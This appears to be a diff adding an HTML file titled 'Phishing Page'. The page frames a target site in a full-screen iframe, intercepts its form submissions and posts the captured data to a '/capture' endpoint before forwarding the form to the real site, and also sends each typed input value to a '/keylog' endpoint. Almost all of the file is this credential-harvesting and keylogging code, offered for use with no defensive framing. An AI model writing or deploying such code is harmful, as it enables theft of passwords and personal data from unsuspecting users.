@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing Page</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <iframe id="targetSite" src=""></iframe>
+    <script>
+        // Inject script to capture form submissions
+        const iframe = document.getElementById('targetSite');
+        iframe.onload = function() {
+            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            const forms = iframeDoc.querySelectorAll('form');
+            forms.forEach(form => {
+                form.addEventListener('submit', function(event) {
+                    event.preventDefault();
+                    const formData = new FormData(form);
+                    const data = Object.fromEntries(formData);
+                    console.log('Captured data from iframe:', data);
+
+                    // Send data to phishing server
+                    fetch('/capture', {
+                        method: 'POST',
+                        body: formData
+                    }).then(response => {
+                        console.log('Data captured:', response.status);
+                        // Submit the form to the original site
+                        form.submit();
+                    }).catch(err => {
+                        console.error('Capture failed:', err);
+                        form.submit();
+                    });
+                });
+            });
+
+            // Capture input changes for real-time keylogging (optional)
+            const inputs = iframeDoc.querySelectorAll('input');
+            inputs.forEach(input => {
+                input.addEventListener('input', function() {
+                    const data = {};
+                    data[input.name || input.id || 'unknown'] = input.value;
+                    fetch('/keylog', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                });
+            });
+        };
+    </script>
+</body>
+</html>
